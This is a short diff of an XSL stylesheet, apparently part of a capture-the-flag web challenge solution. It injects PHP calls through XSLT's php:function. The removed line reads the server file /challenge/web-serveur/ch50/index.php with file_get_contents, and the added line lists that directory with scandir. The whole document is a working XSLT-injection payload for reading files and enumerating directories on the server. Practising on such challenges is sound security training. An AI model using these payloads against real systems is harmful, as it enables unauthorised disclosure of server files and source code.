@@ -9,7 +9,7 @@
     <html>
       <body>
         <pre>
-<xsl:value-of select="php:function('file_get_contents', '/challenge/web-serveur/ch50/index.php')" />
+<xsl:value-of select="php:function('json_encode', php:function('scandir', '/challenge/web-serveur/ch50'))" />
         </pre>
       </body>
     </html>
